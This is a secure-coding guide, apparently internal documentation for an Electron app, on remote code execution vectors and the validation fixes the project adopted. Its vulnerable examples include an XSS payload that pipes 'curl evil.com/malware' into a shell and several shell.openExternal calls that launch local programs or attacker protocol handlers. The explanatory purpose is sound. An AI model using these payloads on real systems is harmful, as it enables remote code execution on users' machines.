# Remote Code Execution (RCE) in Electron

## The Threat

Remote Code Execution is the most severe class of vulnerability. In Electron, RCE means an attacker can execute **arbitrary commands on the user's machine** — install malware, steal files, access credentials.

Three common Electron RCE vectors:

### 1. `nodeIntegration: true`

```javascript
// ❌ If nodeIntegration is enabled, ANY XSS becomes RCE:
<img src=x onerror="require('child_process').exec('curl evil.com/malware | sh')">
```

### 2. Unrestricted `shell.openExternal`

**This was a REAL bug found in DJ.ai during MOE Round 1 review.**

```javascript
// ❌ VULNERABLE — original code
shell.openExternal(url);  // url comes from renderer, no validation

// Attacker sends:
shell.openExternal("file:///Applications/Calculator.app");  // macOS
shell.openExternal("cmd:///c calc.exe");  // Windows
shell.openExternal("ssh://attacker.com");  // Any protocol handler
```

The fix:
```javascript
// ✅ SAFE — validate protocol before opening
// electron-app/electron/validation.cjs
function isAllowedExternalProtocol(urlString) {
  try {
    const url = new URL(urlString);
    return url.protocol === 'https:';  // ONLY https allowed
  } catch {
    return false;
  }
}
```

### 3. Unvalidated `executeJavaScript`

```javascript
// ❌ VULNERABLE — executing arbitrary code in webview
webview.executeJavaScript(userProvidedCode);

// ✅ SAFE — use pre-built action maps
const ACTIONS = {
  'play': 'document.querySelector("video").play()',
  'pause': 'document.querySelector("video").pause()',
};
webview.executeJavaScript(ACTIONS[action]);  // Only predefined actions
```

## DJ.ai Implementation

DJ.ai addresses all three RCE vectors:

| File | Protection |
|------|------------|
| `electron-app/electron/main.cjs` | `nodeIntegration: false` for all windows |
| `electron-app/electron/validation.cjs` | `isAllowedExternalProtocol()` — HTTPS only |
| `electron-app/electron/validation.cjs` | `isValidPlaybackAction()` — allowlist of valid actions |
| `electron-app/electron/main.cjs` | `shell.openExternal` gated by protocol validation |

### The MOE Review Finding

During Mixture-of-Experts code review (Round 1), a security-focused reviewer identified that `shell.openExternal` was called with unvalidated URLs from the renderer process. The fix involved:

1. Creating `isAllowedExternalProtocol()` in `validation.cjs`
2. Restricting to `https:` protocol only
3. Adding tests for protocol smuggling attempts (`javascript:`, `file:`, `ssh:`, `ftp:`)

### Playback Action Safety

YouTube Music controls use `executeJavaScript` to interact with the embedded player. Instead of accepting arbitrary strings, DJ.ai uses an action allowlist:

```javascript
// electron-app/electron/validation.cjs
function isValidPlaybackAction(action) {
  const VALID_ACTIONS = ['play', 'pause', 'next', 'previous', 'togglePlay'];
  return VALID_ACTIONS.includes(action);
}
```

## Key Takeaways

- **`nodeIntegration: false`** — non-negotiable; turns every XSS into RCE if enabled
- **Validate `shell.openExternal` URLs** — restrict to `https:` protocol only
- **Never pass user input to `executeJavaScript`** — use pre-built action maps
- **Validate in the main process** — the renderer is untrusted; never trust its messages
- RCE bugs are often found in code that "looks fine" — security review catches what tests don't

## References

- [Electron — shell.openExternal Dangers](https://www.electronjs.org/docs/latest/tutorial/security#15-do-not-use-shellopenexternal-with-untrusted-content)
- [Benjamin Altpeter — shell.openExternal Dangers](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [OWASP — Remote Code Execution](https://owasp.org/www-community/attacks/Code_Injection)
